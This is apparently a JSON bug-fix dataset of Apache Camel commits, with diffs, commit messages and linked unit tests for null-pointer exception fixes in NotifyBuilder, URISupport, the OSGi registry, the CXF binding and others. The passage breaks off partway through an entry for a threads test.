{
    "camel_012f744": {
        "bug_id": "camel_012f744",
        "commit": "https://github.com/apache/camel/commit/012f744396a6f3f15a7f91a7a0d1b9cea7663495",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/012f744396a6f3f15a7f91a7a0d1b9cea7663495/core/camel-core/src/main/java/org/apache/camel/builder/NotifyBuilder.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/core/camel-core/src/main/java/org/apache/camel/builder/NotifyBuilder.java?ref=012f744396a6f3f15a7f91a7a0d1b9cea7663495",
                "deletions": 2,
                "filename": "core/camel-core/src/main/java/org/apache/camel/builder/NotifyBuilder.java",
                "patch": "@@ -117,7 +117,11 @@ public boolean isAbstract() {\n             @Override\n             public boolean onExchange(Exchange exchange) {\n                 // filter non matching exchanges\n-                return EndpointHelper.matchEndpoint(context, exchange.getFromEndpoint().getEndpointUri(), endpointUri);\n+                if (exchange.getFromEndpoint() != null) {\n+                    return EndpointHelper.matchEndpoint(context, exchange.getFromEndpoint().getEndpointUri(), endpointUri);\n+                } else {\n+                    return false;\n+                }\n             }\n \n             public boolean matches() {\n@@ -191,7 +195,7 @@ public boolean onExchange(Exchange exchange) {\n                 // and just continue to route that on the consumer side, which causes the EventNotifier not to\n                 // emit events when the consumer received the exchange, as its already done. For example by\n                 // ProducerTemplate which creates the UoW before producing messages.\n-                if (exchange.getFromEndpoint().getEndpointUri().startsWith(\"direct:\")) {\n+                if (exchange.getFromEndpoint() != null && exchange.getFromEndpoint().getEndpointUri().startsWith(\"direct:\")) {\n                     return true;\n                 }\n                 return PatternHelper.matchPattern(exchange.getFromRouteId(), \"*\");",
                "raw_url": "https://github.com/apache/camel/raw/012f744396a6f3f15a7f91a7a0d1b9cea7663495/core/camel-core/src/main/java/org/apache/camel/builder/NotifyBuilder.java",
                "sha": "1fd4677ee0991485aae763165a76affd0a4b44c8",
                "status": "modified"
            }
        ],
        "message": "CAMEL-13645: Fixed potential NPE in NotifyBuilder.",
        "parent": "https://github.com/apache/camel/commit/449f8a76ac123f1ebab5fa650a280078aae09fdc",
        "patched_files": [
            "NotifyBuilder.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "NotifyBuilderTest.java"
        ]
    },
    "camel_02b2771": {
        "bug_id": "camel_02b2771",
        "commit": "https://github.com/apache/camel/commit/02b277179d876e0f9ec6ec3aca434d3ca6dc2f71",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/02b277179d876e0f9ec6ec3aca434d3ca6dc2f71/camel-core/src/main/java/org/apache/camel/util/URISupport.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/URISupport.java?ref=02b277179d876e0f9ec6ec3aca434d3ca6dc2f71",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/util/URISupport.java",
                "patch": "@@ -286,8 +286,11 @@ public static String createQueryString(Map options) throws URISyntaxException {\n                     String key = (String) o;\n                     String value = (String) options.get(key);\n                     rc.append(URLEncoder.encode(key, \"UTF-8\"));\n-                    rc.append(\"=\");\n-                    rc.append(URLEncoder.encode(value, \"UTF-8\"));\n+                    // only append if value is not null\n+                    if (value != null) {\n+                        rc.append(\"=\");\n+                        rc.append(URLEncoder.encode(value, \"UTF-8\"));\n+                    }\n                 }\n                 return rc.toString();\n             } else {",
                "raw_url": "https://github.com/apache/camel/raw/02b277179d876e0f9ec6ec3aca434d3ca6dc2f71/camel-core/src/main/java/org/apache/camel/util/URISupport.java",
                "sha": "866048449dc6b53ad16b05ba2a86d1bd571b67ba",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/02b277179d876e0f9ec6ec3aca434d3ca6dc2f71/camel-core/src/test/java/org/apache/camel/util/URISupportTest.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/util/URISupportTest.java?ref=02b277179d876e0f9ec6ec3aca434d3ca6dc2f71",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/util/URISupportTest.java",
                "patch": "@@ -85,4 +85,9 @@ public void testNormalizeHttpEndpoint() throws Exception {\n         assertTrue(\"Should have //\", out2.startsWith(\"http://\"));\n     }\n \n+    public void testNormalizeUriWhereParamererIsFaulty() throws Exception {\n+        String out = URISupport.normalizeUri(\"stream:uri?file:///d:/temp/data/log/quickfix.log&scanStream=true\");\n+        assertNotNull(out);\n+    }\n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/02b277179d876e0f9ec6ec3aca434d3ca6dc2f71/camel-core/src/test/java/org/apache/camel/util/URISupportTest.java",
                "sha": "7562a705fe04574463949188e4762b9b578f8329",
                "status": "modified"
            }
        ],
        "message": "Fixed NPE in URISupport if URI parameter did not contain a value.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@793814 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/b6e17e828774b1bc2dccc5c99a3a08188d49a2e1",
        "patched_files": [
            "URISupport.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "URISupportTest.java"
        ]
    },
    "camel_02cab21": {
        "bug_id": "camel_02cab21",
        "commit": "https://github.com/apache/camel/commit/02cab21e3ffb5199c5636854be74f4fec724aecf",
        "file": [
            {
                "additions": 13,
                "blob_url": "https://github.com/apache/camel/blob/02cab21e3ffb5199c5636854be74f4fec724aecf/components/camel-core-osgi/src/main/java/org/apache/camel/core/osgi/OsgiServiceRegistry.java",
                "changes": 25,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-core-osgi/src/main/java/org/apache/camel/core/osgi/OsgiServiceRegistry.java?ref=02cab21e3ffb5199c5636854be74f4fec724aecf",
                "deletions": 12,
                "filename": "components/camel-core-osgi/src/main/java/org/apache/camel/core/osgi/OsgiServiceRegistry.java",
                "patch": "@@ -16,7 +16,6 @@\n  */\n package org.apache.camel.core.osgi;\n \n-import java.util.Collections;\n import java.util.HashMap;\n import java.util.Map;\n import java.util.Queue;\n@@ -55,11 +54,11 @@ public OsgiServiceRegistry(BundleContext bc) {\n                 if (refs != null && refs.length > 0) {\n                     // just return the first one\n                     sr = refs[0];\n-                }\n-                serviceReferenceQueue.add(sr);\n-                service = bundleContext.getService(sr);\n-                if (service != null) {\n-                    serviceCacheMap.put(name, service);\n+                    serviceReferenceQueue.add(sr);\n+                    service = bundleContext.getService(sr);\n+                    if (service != null) {\n+                        serviceCacheMap.put(name, service);\n+                    }\n                 }\n             } catch (Exception ex) {\n                 throw ObjectHelper.wrapRuntimeCamelException(ex);\n@@ -94,12 +93,14 @@ public Object lookup(String name) {\n             ServiceReference<?>[] refs = bundleContext.getAllServiceReferences(type.getName(), null);\n             if (refs != null) {\n                 for (ServiceReference<?> sr : refs) {\n-                    serviceReferenceQueue.add(sr);\n-                    Object service = bundleContext.getService(sr);\n-                    if (service != null) {\n-                        String name = (String)sr.getProperty(\"name\");\n-                        if (name != null) {\n-                            result.put(name , type.cast(service));\n+                    if (sr != null) {\n+                        Object service = bundleContext.getService(sr);\n+                        serviceReferenceQueue.add(sr);\n+                        if (service != null) {\n+                            String name = (String)sr.getProperty(\"name\");\n+                            if (name != null) {\n+                                result.put(name , type.cast(service));\n+                            }\n                         }\n                     }\n                 }",
                "raw_url": "https://github.com/apache/camel/raw/02cab21e3ffb5199c5636854be74f4fec724aecf/components/camel-core-osgi/src/main/java/org/apache/camel/core/osgi/OsgiServiceRegistry.java",
                "sha": "67408097c47e60c108af180a43cebea4d8348f3c",
                "status": "modified"
            },
            {
                "additions": 13,
                "blob_url": "https://github.com/apache/camel/blob/02cab21e3ffb5199c5636854be74f4fec724aecf/components/camel-core-osgi/src/test/java/org/apache/camel/core/osgi/CamelMockBundleContext.java",
                "changes": 13,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-core-osgi/src/test/java/org/apache/camel/core/osgi/CamelMockBundleContext.java?ref=02cab21e3ffb5199c5636854be74f4fec724aecf",
                "deletions": 0,
                "filename": "components/camel-core-osgi/src/test/java/org/apache/camel/core/osgi/CamelMockBundleContext.java",
                "patch": "@@ -66,9 +66,22 @@ public Language resolveLanguage(String name, CamelContext context) {\n             return null;\n         }    \n     }\n+    \n+    public ServiceReference[] getServiceReferences(String clazz, String filter) throws InvalidSyntaxException {\n+        // just simulate when the bundle context doesn't have right service reference\n+        if (filter != null && filter.indexOf(\"name=test\") > 0) {\n+            return null;\n+        } else {\n+            return super.getServiceReferences(clazz, filter);\n+        }\n+    }\n    \n     @SuppressWarnings({\"rawtypes\", \"unchecked\"})\n     public ServiceReference[] getAllServiceReferences(String clazz, String filter) throws InvalidSyntaxException {\n+        // just simulate when the bundle context doesn't have right service reference\n+        if (filter != null && filter.indexOf(\"name=test\") > 0) {\n+            return null;\n+        }\n         MockServiceReference reference = new MockServiceReference(getBundle(), new String[] {clazz});\n         // setup the name property with the class name\n         Dictionary properties = new Hashtable();",
                "raw_url": "https://github.com/apache/camel/raw/02cab21e3ffb5199c5636854be74f4fec724aecf/components/camel-core-osgi/src/test/java/org/apache/camel/core/osgi/CamelMockBundleContext.java",
                "sha": "efda490153918b3fa2b56c6a81d68ebe872275ae",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/02cab21e3ffb5199c5636854be74f4fec724aecf/components/camel-core-osgi/src/test/java/org/apache/camel/core/osgi/ServiceRegistryTest.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-core-osgi/src/test/java/org/apache/camel/core/osgi/ServiceRegistryTest.java?ref=02cab21e3ffb5199c5636854be74f4fec724aecf",
                "deletions": 0,
                "filename": "components/camel-core-osgi/src/test/java/org/apache/camel/core/osgi/ServiceRegistryTest.java",
                "patch": "@@ -31,6 +31,9 @@ public void camelContextFactoryServiceRegistryTest() throws Exception {\n         context.start();\n         MyService myService = context.getRegistry().lookup(MyService.class.getName(), MyService.class);\n         assertNotNull(\"MyService should not be null\", myService);\n+        \n+        myService = context.getRegistry().lookup(\"test\", MyService.class);\n+        assertNull(\"We should not get the MyService Object here\", myService);\n \n         Object service = context.getRegistry().lookup(MyService.class.getName());\n         assertNotNull(\"MyService should not be null\", service);",
                "raw_url": "https://github.com/apache/camel/raw/02cab21e3ffb5199c5636854be74f4fec724aecf/components/camel-core-osgi/src/test/java/org/apache/camel/core/osgi/ServiceRegistryTest.java",
                "sha": "151727a18259bb69664d76ab7dabb5017639f915",
                "status": "modified"
            }
        ],
        "message": "CAMEL-5972 fixed the NPE error\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1435107 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/6516838e048ceb7b9be2d819620f1d4f311b46a9",
        "patched_files": [
            "ServiceRegistry.java",
            "CamelMockBundleContext.java",
            "OsgiServiceRegistry.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ServiceRegistryTest.java"
        ]
    },
    "camel_033f9dd": {
        "bug_id": "camel_033f9dd",
        "commit": "https://github.com/apache/camel/commit/033f9dde09ebcacd8863f33a97d2c06aa1035b4d",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/033f9dde09ebcacd8863f33a97d2c06aa1035b4d/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java?ref=033f9dde09ebcacd8863f33a97d2c06aa1035b4d",
                "deletions": 1,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "patch": "@@ -741,7 +741,7 @@ protected static void addNamespace(Element element, Map<String, String> nsMap) {\n         }\n         MessageContentsList inObjects = MessageContentsList.getContentsList(message);\n         if (inObjects == null) {\n-            return null;\n+            return new ArrayList<Source>(0);\n         }\n         org.apache.cxf.message.Exchange exchange = message.getExchange();\n         BindingOperationInfo boi = exchange.getBindingOperationInfo();",
                "raw_url": "https://github.com/apache/camel/raw/033f9dde09ebcacd8863f33a97d2c06aa1035b4d/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "sha": "f3115739369b11ca83300fd9b88d4480c136c8ae",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/033f9dde09ebcacd8863f33a97d2c06aa1035b4d/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfPayloadConverter.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfPayloadConverter.java?ref=033f9dde09ebcacd8863f33a97d2c06aa1035b4d",
                "deletions": 2,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfPayloadConverter.java",
                "patch": "@@ -170,8 +170,7 @@ private CxfPayloadConverter() {\n         if (CxfPayload.class.isAssignableFrom(value.getClass())) {\n             CxfPayload<?> payload = (CxfPayload<?>) value;\n             \n-            if (payload.getBodySources() != null \n-                && payload.getBodySources().size() == 1) {\n+            if (payload.getBodySources().size() == 1) {\n                 if (type.isAssignableFrom(Document.class)) {\n                     Source s = payload.getBodySources().get(0);\n                     Document d;",
                "raw_url": "https://github.com/apache/camel/raw/033f9dde09ebcacd8863f33a97d2c06aa1035b4d/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfPayloadConverter.java",
                "sha": "ff24d6ce0ff7a57de90729225f65aa204c1efb27",
                "status": "modified"
            },
            {
                "additions": 24,
                "blob_url": "https://github.com/apache/camel/blob/033f9dde09ebcacd8863f33a97d2c06aa1035b4d/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/DefaultCxfBindingTest.java",
                "changes": 24,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/DefaultCxfBindingTest.java?ref=033f9dde09ebcacd8863f33a97d2c06aa1035b4d",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/DefaultCxfBindingTest.java",
                "patch": "@@ -148,6 +148,30 @@ public void testPopupalteExchangeFromCxfResponse() {\n         assertNotNull(camelAttachments.get(\"att-1\"));\n     }\n \n+    @Test\n+    public void testPopupalteExchangeFromCxfResponseOfNullBody() {\n+        DefaultCxfBinding cxfBinding = new DefaultCxfBinding();\n+        cxfBinding.setHeaderFilterStrategy(new DefaultHeaderFilterStrategy());\n+        Exchange exchange = new DefaultExchange(context);\n+        org.apache.cxf.message.Exchange cxfExchange = new org.apache.cxf.message.ExchangeImpl();\n+        exchange.setProperty(CxfConstants.DATA_FORMAT_PROPERTY, DataFormat.PAYLOAD);\n+        Map<String, Object> responseContext = new HashMap<String, Object>();\n+        responseContext.put(org.apache.cxf.message.Message.RESPONSE_CODE, Integer.valueOf(200));\n+        Map<String, List<String>> headers = new TreeMap<String, List<String>>(String.CASE_INSENSITIVE_ORDER);\n+        responseContext.put(org.apache.cxf.message.Message.PROTOCOL_HEADERS, headers);\n+        org.apache.cxf.message.Message cxfMessage = new org.apache.cxf.message.MessageImpl();\n+        cxfExchange.setInMessage(cxfMessage);\n+        \n+        cxfBinding.populateExchangeFromCxfResponse(exchange, cxfExchange, responseContext);\n+\n+        CxfPayload<?> cxfPayload = exchange.getOut().getBody(CxfPayload.class);\n+\n+        assertNotNull(cxfPayload);\n+        List<?> body = cxfPayload.getBody(); \n+        assertNotNull(body);\n+        assertEquals(0, body.size());\n+    }\n+    \n     @Test\n     public void testPopupalteCxfResponseFromExchange() {\n         DefaultCxfBinding cxfBinding = new DefaultCxfBinding();",
                "raw_url": "https://github.com/apache/camel/raw/033f9dde09ebcacd8863f33a97d2c06aa1035b4d/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/DefaultCxfBindingTest.java",
                "sha": "2faa63fe9f2193d0c79f737f6e38c995095e8fa4",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7069: Sending an empty soap body message to a generic provider camel-cxf consumer results in NPE",
        "parent": "https://github.com/apache/camel/commit/8cd86620d09f9641f4d29c5a131f162fd48ec547",
        "patched_files": [
            "CxfPayloadConverter.java",
            "DefaultCxfBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCxfBindingTest.java",
            "CxfPayloadConverterTest.java"
        ]
    },
    "camel_0368fcb": {
        "bug_id": "camel_0368fcb",
        "commit": "https://github.com/apache/camel/commit/0368fcb1c37606875b425d86ebf138d7557f50a9",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/0368fcb1c37606875b425d86ebf138d7557f50a9/camel-core/src/main/java/org/apache/camel/processor/CamelInternalProcessor.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/CamelInternalProcessor.java?ref=0368fcb1c37606875b425d86ebf138d7557f50a9",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/CamelInternalProcessor.java",
                "patch": "@@ -755,7 +755,12 @@ public StreamCache before(Exchange exchange) throws Exception {\n \n         @Override\n         public void after(Exchange exchange, StreamCache sc) throws Exception {\n-            Object body = exchange.getIn().getBody();\n+            Object body = null;\n+            if (exchange.hasOut()) {\n+                body = exchange.getOut().getBody();\n+            } else {\n+                body = exchange.getIn().getBody();\n+            }\n             if (body != null && body instanceof StreamCache) {\n                 // reset so the cache is ready to be reused after processing\n                 ((StreamCache) body).reset();",
                "raw_url": "https://github.com/apache/camel/raw/0368fcb1c37606875b425d86ebf138d7557f50a9/camel-core/src/main/java/org/apache/camel/processor/CamelInternalProcessor.java",
                "sha": "099af1bb60bdc866b72ce3c958912f1ea394d0a9",
                "status": "modified"
            },
            {
                "additions": 48,
                "blob_url": "https://github.com/apache/camel/blob/0368fcb1c37606875b425d86ebf138d7557f50a9/components/camel-servlet/src/test/java/org/apache/camel/component/servlet/HttpClientRouteExampleSpringTest.java",
                "changes": 48,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-servlet/src/test/java/org/apache/camel/component/servlet/HttpClientRouteExampleSpringTest.java?ref=0368fcb1c37606875b425d86ebf138d7557f50a9",
                "deletions": 0,
                "filename": "components/camel-servlet/src/test/java/org/apache/camel/component/servlet/HttpClientRouteExampleSpringTest.java",
                "patch": "@@ -0,0 +1,48 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.servlet;\n+\n+import com.meterware.httpunit.GetMethodWebRequest;\n+import com.meterware.httpunit.WebRequest;\n+import com.meterware.httpunit.WebResponse;\n+import com.meterware.servletunit.ServletUnitClient;\n+import org.junit.Before;\n+import org.junit.Test;\n+\n+public class HttpClientRouteExampleSpringTest extends ServletCamelRouterTestSupport {\n+    @Test\n+    public void testHttpRestricMethod() throws Exception {\n+        \n+        ServletUnitClient client = newClient();\n+        // Send a web get method request\n+        WebRequest  req = new GetMethodWebRequest(CONTEXT_URL + \"/services/hello\");\n+        WebResponse response = client.getResponse(req);\n+        \n+        System.out.println(response.getText());\n+    }\n+\n+    @Before\n+    public void setUp() throws Exception {\n+        startCamelContext = false;\n+        super.setUp();\n+    }\n+   \n+    protected String getConfiguration() {\n+        return \"/org/apache/camel/component/servlet/web-example.xml\";\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/0368fcb1c37606875b425d86ebf138d7557f50a9/components/camel-servlet/src/test/java/org/apache/camel/component/servlet/HttpClientRouteExampleSpringTest.java",
                "sha": "7530776820b4090fbcc56f11f220c80ef012c280",
                "status": "added"
            },
            {
                "additions": 52,
                "blob_url": "https://github.com/apache/camel/blob/0368fcb1c37606875b425d86ebf138d7557f50a9/components/camel-servlet/src/test/resources/org/apache/camel/component/servlet/example-camelContext.xml",
                "changes": 52,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-servlet/src/test/resources/org/apache/camel/component/servlet/example-camelContext.xml?ref=0368fcb1c37606875b425d86ebf138d7557f50a9",
                "deletions": 0,
                "filename": "components/camel-servlet/src/test/resources/org/apache/camel/component/servlet/example-camelContext.xml",
                "patch": "@@ -0,0 +1,52 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n+<!--\n+    Licensed to the Apache Software Foundation (ASF) under one or more\n+    contributor license agreements.  See the NOTICE file distributed with\n+    this work for additional information regarding copyright ownership.\n+    The ASF licenses this file to You under the Apache License, Version 2.0\n+    (the \"License\"); you may not use this file except in compliance with\n+    the License.  You may obtain a copy of the License at\n+\n+    http://www.apache.org/licenses/LICENSE-2.0\n+\n+    Unless required by applicable law or agreed to in writing, software\n+    distributed under the License is distributed on an \"AS IS\" BASIS,\n+    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+    See the License for the specific language governing permissions and\n+    limitations under the License.\n+-->\n+<beans xmlns=\"http://www.springframework.org/schema/beans\"\n+       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n+       xmlns:camel=\"http://camel.apache.org/schema/spring\"\n+       xsi:schemaLocation=\"\n+       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n+       http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd\n+    \">\n+\n+   <camelContext id=\"camel\" streamCache=\"true\" xmlns=\"http://camel.apache.org/schema/spring\" >\n+    <route id=\"helloRoute\">\n+      <!-- incoming requests from the servlet is routed -->\n+      <from uri=\"servlet:///hello\"/>\n+      <choice>\n+        <when>\n+          <!-- is there a header with the key name? -->\n+          <header>name</header>\n+          <!-- yes so return back a message to the user -->\n+          <transform>\n+            <simple>Hello ${header.name} how are you?</simple>\n+          </transform>\n+        </when>\n+        <otherwise>\n+          <!-- if no name parameter then output a syntax to the user -->\n+          <transform>\n+            <constant>Add a name parameter to uri, eg ?name=foo</constant>\n+          </transform>\n+        </otherwise>\n+      </choice>\n+    </route>\n+   </camelContext>\n+   \n+   \n+   \n+\n+</beans>\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/0368fcb1c37606875b425d86ebf138d7557f50a9/components/camel-servlet/src/test/resources/org/apache/camel/component/servlet/example-camelContext.xml",
                "sha": "13637deab7cc21370fd90792910e04caf5b10179",
                "status": "added"
            },
            {
                "additions": 57,
                "blob_url": "https://github.com/apache/camel/blob/0368fcb1c37606875b425d86ebf138d7557f50a9/components/camel-servlet/src/test/resources/org/apache/camel/component/servlet/web-example.xml",
                "changes": 57,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-servlet/src/test/resources/org/apache/camel/component/servlet/web-example.xml?ref=0368fcb1c37606875b425d86ebf138d7557f50a9",
                "deletions": 0,
                "filename": "components/camel-servlet/src/test/resources/org/apache/camel/component/servlet/web-example.xml",
                "patch": "@@ -0,0 +1,57 @@\n+<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n+\n+<!DOCTYPE web-app\n+        PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n+        \"http://java.sun.com/dtd/web-app_2_3.dtd\">\n+\n+<!--\n+  Licensed to the Apache Software Foundation (ASF) under one\n+  or more contributor license agreements. See the NOTICE file\n+  distributed with this work for additional information\n+  regarding copyright ownership. The ASF licenses this file\n+  to you under the Apache License, Version 2.0 (the\n+  \"License\"); you may not use this file except in compliance\n+  with the License. You may obtain a copy of the License at\n+ \n+  http://www.apache.org/licenses/LICENSE-2.0\n+ \n+  Unless required by applicable law or agreed to in writing,\n+  software distributed under the License is distributed on an\n+  \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n+  KIND, either express or implied. See the License for the\n+  specific language governing permissions and limitations\n+  under the License.\n+-->\n+<!-- START SNIPPET: web -->\n+<web-app>\n+\n+    <!-- tell Spring where it should load the XML file -->\n+    <context-param>\n+        <param-name>contextConfigLocation</param-name>\n+        <param-value>classpath:org/apache/camel/component/servlet/example-camelContext.xml</param-value>\n+    </context-param>\n+\n+    <!-- spring context listener which loads the XML file -->\n+    <listener>\n+        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n+    </listener>\n+\n+    <!-- Camel Servlet -->\n+    <servlet>\n+        <servlet-name>CamelServlet</servlet-name>\n+        <display-name>Camel Http Transport Servlet</display-name>\n+        <servlet-class>org.apache.camel.component.servlet.CamelHttpTransportServlet</servlet-class>\n+        <init-param>\n+            <param-name>matchOnUriPrefix</param-name>\n+            <param-value>true</param-value>\n+        </init-param>\n+    </servlet>\n+\n+    <!-- Camel Servlet mappings -->\n+    <servlet-mapping>\n+        <servlet-name>CamelServlet</servlet-name>\n+        <url-pattern>/services/*</url-pattern>\n+    </servlet-mapping>\n+\n+</web-app>\n+<!-- END SNIPPET: web -->\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/0368fcb1c37606875b425d86ebf138d7557f50a9/components/camel-servlet/src/test/resources/org/apache/camel/component/servlet/web-example.xml",
                "sha": "c39b3130c1bf1cd756db7d0fafc7680d93e4dd4f",
                "status": "added"
            }
        ],
        "message": "CAMEL-8157 Fixed NPE error of camel-example-servlet-tomcat with the streamcache enabled.",
        "parent": "https://github.com/apache/camel/commit/f1bd37b0ad0a3f7efbf0de2e99bb913cd9ccec6e",
        "patched_files": [
            "web-example.java",
            "CamelInternalProcessor.java",
            "example-camelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "HttpClientRouteExampleSpringTest.java"
        ]
    },
    "camel_045a230": {
        "bug_id": "camel_045a230",
        "commit": "https://github.com/apache/camel/commit/045a23054e266df6ae09c17744d240012938b83c",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/045a23054e266df6ae09c17744d240012938b83c/camel-core/src/main/java/org/apache/camel/component/rest/RestEndpoint.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/rest/RestEndpoint.java?ref=045a23054e266df6ae09c17744d240012938b83c",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/component/rest/RestEndpoint.java",
                "patch": "@@ -270,6 +270,12 @@ public void setBindingMode(final RestBindingMode bindingMode) {\n \n     @Override\n     public Producer createProducer() throws Exception {\n+        if (ObjectHelper.isEmpty(host)) {\n+            // hostname must be provided\n+            throw new IllegalArgumentException(\"Hostname must be configured on either restConfiguration\"\n+                + \" or in the rest endpoint uri as a query parameter with name host, eg rest:\" + method + \":\" + path + \"?host=someserver\");\n+        }\n+\n         RestProducerFactory apiDocFactory = null;\n         RestProducerFactory factory = null;\n ",
                "raw_url": "https://github.com/apache/camel/raw/045a23054e266df6ae09c17744d240012938b83c/camel-core/src/main/java/org/apache/camel/component/rest/RestEndpoint.java",
                "sha": "5518a10e6dc75c8ec0181453bab650f19e4e34e3",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11216: REST-DSL - Producer fails with NPE or other exceptions if you have not set a hostname",
        "parent": "https://github.com/apache/camel/commit/9a54dcc131442384c600eb536503395d105e959d",
        "patched_files": [
            "RestEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RestEndpointTest.java"
        ]
    },
    "camel_04a2c77": {
        "bug_id": "camel_04a2c77",
        "commit": "https://github.com/apache/camel/commit/04a2c77c3080c8464286e29d0a2e00467a0957c6",
        "file": [
            {
                "additions": 16,
                "blob_url": "https://github.com/apache/camel/blob/04a2c77c3080c8464286e29d0a2e00467a0957c6/camel-core/src/test/java/org/apache/camel/processor/ThreadsCorePoolTest.java",
                "changes": 18,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/ThreadsCorePoolTest.java?ref=04a2c77c3080c8464286e29d0a2e00467a0957c6",
                "deletions": 2,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/ThreadsCorePoolTest.java",
                "patch": "@@ -26,8 +26,8 @@\n  */\n public class ThreadsCorePoolTest extends ContextTestSupport {\n \n-    private static String beforeThreadName;\n-    private static String afterThreadName;\n+    private String beforeThreadName;\n+    private volatile String afterThreadName;\n \n     public void testThreadsCorePool() throws Exception {\n         getMockEndpoint(\"mock:result\").expectedMessageCount(1);\n@@ -36,6 +36,8 @@ public void testThreadsCorePool() throws Exception {\n \n         assertMockEndpointsSatisfied();\n \n+        assertNotNull(\"The main thread name should be already properly set!\", beforeThreadName);\n+        assertNotNull(\"The camel thread name should be already properly set!\", afterThreadName);\n         assertFalse(\"Should use different threads\", beforeThreadName.equalsIgnoreCase(afterThreadName));\n     }\n \n@@ -46,6 +48,8 @@ public void testThreadsCorePoolBuilder() throws Exception {\n \n         assertMockEndpointsSatisfied();\n \n+        assertNotNull(\"The main thread name should be already properly set!\", beforeThreadName);\n+        assertNotNull(\"The camel thread name should be already properly set!\", afterThreadName);\n         assertFalse(\"Should use different threads\", beforeThreadName.equalsIgnoreCase(afterThreadName));\n     }\n \n@@ -74,8 +78,18 @@ public void process(Exchange exchange) throws Exception {\n                     